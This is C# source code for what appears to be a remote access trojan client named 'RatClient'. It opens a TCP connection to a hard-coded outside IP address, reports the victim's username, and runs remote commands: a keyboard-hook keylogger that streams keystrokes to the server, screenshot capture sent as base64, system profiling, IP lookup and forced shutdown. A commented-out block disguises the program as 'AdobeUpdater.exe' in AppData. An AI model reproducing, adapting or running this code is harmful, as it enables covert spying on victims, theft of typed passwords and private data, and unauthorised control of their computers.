using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.Http;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RatClient {
    internal static class Program {

        static volatile bool DoLogKeys = false;
        static volatile List<Duple<Keys, bool>> keysPressed = new List<Duple<Keys, bool>>();

        class Duple <T1, T2> {
            public T1 key;
            public T2 value;
            public Duple(T1 key, T2 value) {
                this.key = key;
                this.value = value;
            }
        }

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll")]
        public static extern int GetKeyState(Int32 i);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        public static extern int ToUnicode(
            uint virtualKeyCode,
            uint scanCode,
            byte[] keyboardState,
            StringBuilder receivingBuffer,
            int bufferSize,
            uint flags
        );

        static string GetCharsFromKeys(Keys keys, bool shift) {
            var buf = new StringBuilder(256);
            var keyboardState = new byte[256];
            if (shift) {
                keyboardState[(int)Keys.ShiftKey] = 0xff;
            }
            ToUnicode((uint)keys, 0, keyboardState, buf, 256, 0);
            return buf.ToString();
        }

        [STAThread]
        static void Main() {
            InterceptKeys.Main2();
        }

        static void Run() {
            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var folder = Environment.CurrentDirectory;
            // MessageBox.Show("appdata: " + appdata + "\nfolder: " + folder);

            /*
            var thisExe = System.Reflection.Assembly.GetExecutingAssembly().Location;
            if (appdata != folder) {
                var newExe = appdata + "/AdobeUpdater.exe";
                File.Copy(thisExe, newExe, true);
                // File.SetAttributes(newExe, FileAttributes.Hidden);
                Process.Start(new ProcessStartInfo {
                    FileName = newExe,
                    WorkingDirectory = appdata
                });
                Environment.Exit(0);
                return;
            }
            */

            while (true) {
                TcpClient tcpClient = null;
                try {
                    tcpClient = new TcpClient();
                    tcpClient.Connect("81.159.75.180", 12345);

                    var stream = tcpClient.GetStream();

                    // Send username
                    WriteString(Environment.UserName, stream);

                    // Keepalive thread
                    new Thread(() => {
                        try {
                            while (true) {
                                WriteString("keepalive", stream);
                                Thread.Sleep(1000);
                            }
                        } catch {
                        }
                    }).Start();

                    // Keylogger thread
                    new Thread(() => {

                        try {
                            bool wasShiftDown = false;
                            bool isShiftDown = false;
                            while (true) {
                                if (DoLogKeys) {

                                    try {
                                        wasShiftDown = isShiftDown;
                                        isShiftDown = GetAsyncKeyState((int)Keys.Shift) == -32767;
                                        bool isCapsDown = (GetAsyncKeyState((int)Keys.CapsLock) & 0x0001) != 0;

                                        if (!isShiftDown && wasShiftDown != isCapsDown) {
                                            WriteString("kl:[Unshift]", stream);
                                        }
                                        while (keysPressed.Count > 0) {
                                            var duple = keysPressed[0];
                                            var str = asciiToStr((int)duple.key);
                                            /*
                                            if ((int)key != 8) {
                                                str = GetCharsFromKeys(key, isShiftDown).Trim();
                                                if (str.Length == 0) str = key.ToString();
                                            } else {
                                                str = "[Backspace]";
                                            }
                                            */
                                            keysPressed.RemoveAt(0);
                                            if (str.Length == 1 && str[0] >= 'A' && str[0] <= 'Z') {
                                                if (isCapsDown) {
                                                    //str = str.ToUpper();
                                                    if (isShiftDown) {
                                                        str = str.ToLower();
                                                    }
                                                } else {
                                                    str = str.ToLower();
                                                    if (isShiftDown) {
                                                        str = str.ToUpper();
                                                    }
                                                }
                                            }
                                            WriteString("kl:" + str.ToString() + ":" + duple.value, stream);
                                        }

                                    } catch (Exception e) {
                                        Debug.WriteLine(e.Message + "\n" + e.StackTrace);
                                    }

                                    Thread.Sleep(1);
                                } else {
                                    if (keysPressed.Count > 0)
                                        keysPressed.Clear();
                                    Thread.Sleep(10);
                                }
                            }
                        } catch {
                        }
                    }).Start();

                    while (true) {
                        var str = ReadString(stream);

                        if (str.Equals("exit", StringComparison.OrdinalIgnoreCase)
                            || str.Equals("quit", StringComparison.OrdinalIgnoreCase))
                            break;

                        if (str.Equals("keepalive"))
                            continue;

                        ProcessCommand(str, stream);
                    }

                    tcpClient.Close();
                    tcpClient = null;
                } catch {
                    // MessageBox.Show(e.Message + "\n" + e.StackTrace);
                }
                tcpClient?.Close();
                DoLogKeys = false;
                Thread.Sleep(5000);
            }
        }

        private static string ReadString(NetworkStream stream) {
            byte[] buffer = new byte[10];
            stream.Read(buffer, 0, buffer.Length);

            var str = Encoding.UTF8.GetString(buffer);
            int num = int.Parse(str);

            buffer = new byte[num];
            stream.Read(buffer, 0, buffer.Length);

            return Encoding.UTF8.GetString(buffer);
        }

        private static void WriteString(string str, NetworkStream stream) {
            // Make and send 'length' of string (10 bytes)
            int len = str.Length;
            string lenStr = len.ToString();
            lenStr = lenStr.PadLeft(10, '0');
            var bytes = Encoding.UTF8.GetBytes(lenStr);
            stream.Write(bytes, 0, bytes.Length);

            // Actually send 'string' (X bytes)
            bytes = Encoding.UTF8.GetBytes(str);
            stream.Write(bytes, 0, bytes.Length);
        }

        private static async void ProcessCommand(string str, NetworkStream stream) {
            switch (str) {
                case "hello":
                    WriteString("hello world", stream);
                    break;
                case "specs":
                    var result = new List<string> {
                        "Username: " + Environment.UserName,
                        "MachineName: " + Environment.MachineName,
                        ""
                    };
                    AddSpecs(result);
                    WriteString(string.Join("\n", result.ToArray()), stream);
                    break;
                case "ip":
                    using (HttpClient client = new HttpClient()) {
                        string value = "";
                        string url = "http://ip4only.me/api/";
                        var response = await client.GetAsync(url);
                        response.EnsureSuccessStatusCode();

                        string data = await response.Content.ReadAsStringAsync();

                        string[] dataArray = data.Split(',');
                        value = dataArray[1];

                        if (value.Equals(""))
                            WriteString("Unable to retrieve IP", stream);
                        else
                            WriteString(value, stream);
                    }
                    break;
                case "turn_off":
                    WriteString("Turning off PC", stream);
                    Process.Start("shutdown", "/s /t 0");
                    Environment.Exit(0);
                    break;
                case "keylogger":
                    DoLogKeys = !DoLogKeys;
                    break;
                case "directory":
                    WriteString(Environment.CurrentDirectory, stream);
                    break;
                default:
                    if (str.Equals("screenshot") || str.StartsWith("screenshot ")) {
                        int quality = 75;
                        if (str.Contains(" ") && int.TryParse(str.Substring(11).Trim(), out int t))
                            quality = Math.Max(Math.Min(100, t), 0);
                        TakeScreenshot(stream, quality);
                    }
                    break;
            }
        }

        private static ImageCodecInfo GetEncoder(ImageFormat format) {
            foreach (var codec in ImageCodecInfo.GetImageEncoders())
                if (codec.FormatID == format.Guid)
                    return codec;
            return null;
        }

        private static void TakeScreenshot(NetworkStream stream, int quality) {
            int left = SystemInformation.VirtualScreen.Left;
            int top = SystemInformation.VirtualScreen.Top;
            int width = SystemInformation.VirtualScreen.Width;
            int height = SystemInformation.VirtualScreen.Height;

            byte[] bytes = null;
            using (var bmp = new Bitmap(width, height)) {
                using (var g = Graphics.FromImage(bmp)) {
                    g.CopyFromScreen(left, top, 0, 0, bmp.Size);
                }
                using (var ms = new MemoryStream()) {
                    var encParams = new EncoderParameters(1);
                    encParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                    bmp.Save(ms, GetEncoder(ImageFormat.Jpeg), encParams);
                    bytes = ms.ToArray();
                }
            }
            var base64 = Convert.ToBase64String(bytes);

            Debug.WriteLine("base64 length: " + base64.Length);
            WriteString("screenshot:" + base64, stream);
        }

        private static void AddSpecs(List<string> result) {
            using (var mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem")) {
                foreach (var obj in mos.Get()) {
                    result.Add("OS Name: " + obj["Caption"]);
                    result.Add("OS Version: " + obj["Version"]);
                    result.Add("OS InstallDate: " + ManagementDateTimeConverter.ToDateTime(obj["InstallDate"].ToString()));
                    break;
                }
            }

            result.Add("");
            using (var mos = new ManagementObjectSearcher("select * from Win32_Processor")) {
                foreach (var obj in mos.Get()) {
                    result.Add("CPU Name: " + obj["Name"]);
                    result.Add("\tCPU Cores: " + Environment.ProcessorCount);
                    result.Add("\tCPU Speed: " + obj["CurrentClockSpeed"] + "Mhz");
                    result.Add("\tCPU Speed Max: " + obj["MaxClockSpeed"] + "Mhz");
                    break;
                }
            }

            result.Add("");
            using (var mos = new ManagementObjectSearcher("select * from Win32_VideoController")) {
                foreach (var obj in mos.Get()) {
                    result.Add("GPU Name: " + obj["Name"]);
                    result.Add("\tGPU DeviceId: " + obj["DeviceId"]);
                    result.Add("\tGPU AdapterRAM: " + obj["AdapterRAM"]);
                    result.Add("\tGPU AdapterDACType: " + obj["AdapterDACType"]);
                    result.Add("\tGPU Monochrome: " + obj["Monochrome"]);
                    // result.Add("\tGPU InstalledDisplayDrivers: " + obj["InstalledDisplayDrivers"]);
                    result.Add("\tGPU DriverVersion: " + obj["DriverVersion"]);
                    result.Add("\tGPU VideoProcessor: " + obj["VideoProcessor"]);
                    result.Add("\tGPU VideoArchitecture: " + obj["VideoArchitecture"]);
                    result.Add("\tGPU VideoMemoryType: " + obj["VideoMemoryType"]);
                }
            }
        }

        private static string asciiToStr(int code) {
            string key = "";
            if (code == 8) key = "[Backspace]";
            else if (code == 9) key = "[Tab]";
            else if (code == 13) key = "[Enter]";
            else if (code == 19) key = "[Pause]";
            else if (code == 20) key = "[Caps Lock]";
            else if (code == 27) key = "[Esc]";
            else if (code == 32) key = "[Space]";
            else if (code == 33) key = "[Page Up]";
            else if (code == 34) key = "[Page Down]";
            else if (code == 35) key = "[End]";
            else if (code == 36) key = "[Home]";
            else if (code == 37) key = "[Left]";
            else if (code == 38) key = "[Up]";
            else if (code == 39) key = "[Right]";
            else if (code == 40) key = "[Down]";
            else if (code == 44) key = "[Print Screen]";
            else if (code == 45) key = "[Insert]";
            else if (code == 46) key = "[Delete]";
            else if (code == 48) key = "0";
            else if (code == 49) key = "1";
            else if (code == 50) key = "2";
            else if (code == 51) key = "3";
            else if (code == 52) key = "4";
            else if (code == 53) key = "5";
            else if (code == 54) key = "6";
            else if (code == 55) key = "7";
            else if (code == 56) key = "8";
            else if (code == 57) key = "9";
            else if (code == 65) key = "a";
            else if (code == 66) key = "b";
            else if (code == 67) key = "c";
            else if (code == 68) key = "d";
            else if (code == 69) key = "e";
            else if (code == 70) key = "f";
            else if (code == 71) key = "g";
            else if (code == 72) key = "h";
            else if (code == 73) key = "i";
            else if (code == 74) key = "j";
            else if (code == 75) key = "k";
            else if (code == 76) key = "l";
            else if (code == 77) key = "m";
            else if (code == 78) key = "n";
            else if (code == 79) key = "o";
            else if (code == 80) key = "p";
            else if (code == 81) key = "q";
            else if (code == 82) key = "r";
            else if (code == 83) key = "s";
            else if (code == 84) key = "t";
            else if (code == 85) key = "u";
            else if (code == 86) key = "v";
            else if (code == 87) key = "w";
            else if (code == 88) key = "x";
            else if (code == 89) key = "y";
            else if (code == 90) key = "z";
            else if (code == 91) key = "[Windows]";
            else if (code == 92) key = "[Windows]";
            else if (code == 93) key = "[List]";
            else if (code == 96) key = "0";
            else if (code == 97) key = "1";
            else if (code == 98) key = "2";
            else if (code == 99) key = "3";
            else if (code == 100) key = "4";
            else if (code == 101) key = "5";
            else if (code == 102) key = "6";
            else if (code == 103) key = "7";
            else if (code == 104) key = "8";
            else if (code == 105) key = "9";
            else if (code == 106) key = "*";
            else if (code == 107) key = "+";
            else if (code == 109) key = "-";
            else if (code == 110) key = ",";
            else if (code == 111) key = "/";
            else if (code == 112) key = "[F1]";
            else if (code == 113) key = "[F2]";
            else if (code == 114) key = "[F3]";
            else if (code == 115) key = "[F4]";
            else if (code == 116) key = "[F5]";
            else if (code == 117) key = "[F6]";
            else if (code == 118) key = "[F7]";
            else if (code == 119) key = "[F8]";
            else if (code == 120) key = "[F9]";
            else if (code == 121) key = "[F10]";
            else if (code == 122) key = "[F11]";
            else if (code == 123) key = "[F12]";
            else if (code == 144) key = "[Num Lock]";
            else if (code == 145) key = "[Scroll Lock]";
            else if (code == 160) key = "[Shift]";
            else if (code == 161) key = "[Shift]";
            else if (code == 162) key = "[Ctrl]";
            else if (code == 163) key = "[Ctrl]";
            else if (code == 164) key = "[Alt]";
            else if (code == 165) key = "[Alt]";
            else if (code == 187) key = "=";
            else if (code == 186) key = "ç";
            else if (code == 188) key = ",";
            else if (code == 189) key = "-";
            else if (code == 190) key = ".";
            else if (code == 192) key = "'";
            else if (code == 191) key = ";";
            else if (code == 193) key = "/";
            else if (code == 194) key = ".";
            else if (code == 219) key = "´";
            else if (code == 220) key = "]";
            else if (code == 221) key = "[";
            else if (code == 222) key = "~";
            else if (code == 226) key = "\\";
            else key = "[" + code + "]";
            return key;
        }

        static class InterceptKeys {
            private const int WH_KEYBOARD_LL = 13;
            private const int WM_KEYDOWN = 0x0100;
            private const int WM_KEYUP = 0x0101;
            private static LowLevelKeyboardProc _proc;
            private static IntPtr _hookID = IntPtr.Zero;

            public static void Main2() {
                new Thread(() => {
                    _proc = HookCallback;
                    _hookID = SetHook(_proc);
                    AppDomain.CurrentDomain.ProcessExit += (s, e) => UnhookWindowsHookEx(_hookID);
                    while (true) {
                        Application.DoEvents();
                    }
                }).Start();
                Run();
            }

            private static IntPtr SetHook(LowLevelKeyboardProc proc) {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule) {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                        GetModuleHandle(curModule.ModuleName), 0);
                }
            }

            private delegate IntPtr LowLevelKeyboardProc(
                int nCode, IntPtr wParam, IntPtr lParam);

            private static IntPtr HookCallback(
                int nCode, IntPtr wParam, IntPtr lParam) {
                if (DoLogKeys && nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_KEYUP)) {
                    bool isDown = wParam == (IntPtr)WM_KEYDOWN;
                    int vkCode = Marshal.ReadInt32(lParam);
                    keysPressed.Add(new Duple<Keys, bool>((Keys)vkCode, isDown));
                    //Console.WriteLine((Keys)vkCode);
                }
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr SetWindowsHookEx(int idHook,
                LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
                IntPtr wParam, IntPtr lParam);

            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr GetModuleHandle(string lpModuleName);
        }
    }
}